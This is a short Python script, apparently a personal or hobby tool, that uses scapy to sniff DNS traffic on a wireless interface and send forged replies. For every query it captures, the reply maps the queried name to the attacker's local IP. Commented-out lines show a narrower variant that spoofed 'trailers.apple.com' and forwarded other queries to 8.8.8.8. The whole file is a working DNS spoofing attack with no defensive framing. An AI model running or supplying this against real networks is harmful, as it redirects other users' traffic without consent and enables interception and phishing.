import os
# from __future__ import print_function
from scapy.all import *
 
local_ip = '172.16.165.170'
# bpf_filt = 'udp port 53 and ip src {0}'.format(local_ip)
bpf_filt = 'udp port 53'
 
def forward_dns(orig_pkt):
    print('hello')
    print('Forwarding:', orig_pkt[DNSQR].qname)
    response = sr1(IP(dst='8.8.8.8')/UDP(sport=orig_pkt[UDP].sport)/\
        DNS(rd=1,id=orig_pkt[DNS].id,qd=DNSQR(qname=orig_pkt[DNSQR].qname)), verbose=0)
    respPkt = IP(dst=orig_pkt[IP].src)/UDP(dport=orig_pkt[UDP].sport)/DNS()
    respPkt[DNS] = response[DNS]
    send(respPkt, verbose=0)
    return 'Responding: {}'.format(respPkt.summary())

def get_response(pkt):
    if (
        DNS in pkt and
        pkt[DNS].opcode == 0 and
        pkt[DNS].ancount == 0 
        # and
        # pkt[IP].src != local_ip
    ):
        os.system('clear')
        pkt.show()
        spfResp = IP(dst=pkt[IP].src)\
                /UDP(dport=pkt[UDP].sport, sport=53)\
                /DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=local_ip)\
                /DNSRR(rrname=pkt[DNSQR].qname,rdata=local_ip))
        send(spfResp, verbose=0)

        print(pkt[DNSQR].qname)

        print('\n\n\n')
        spfResp.show()

        print('Packet sent to ' + pkt[IP].src)
        # if 'trailers.apple.com' in str(pkt['DNS Question Record'].qname):
        #     spfResp = IP(dst=pkt[IP].src)\
        #         /UDP(dport=pkt[UDP].sport, sport=53)\
        #         /DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=local_ip)\
        #         /DNSRR(rrname='trailers.apple.com',rdata=local_ip))
        #     send(spfResp, verbose=0)
        #     return 'Spoofed DNS Response Sent'

        # else:
        #     # make DNS query, capturing the answer and send the answer
        #     return forward_dns(pkt)

os.system('clear')

print('Empezamos')

sniff(filter=bpf_filt , iface='wlp2s0', store=0, prn=get_response)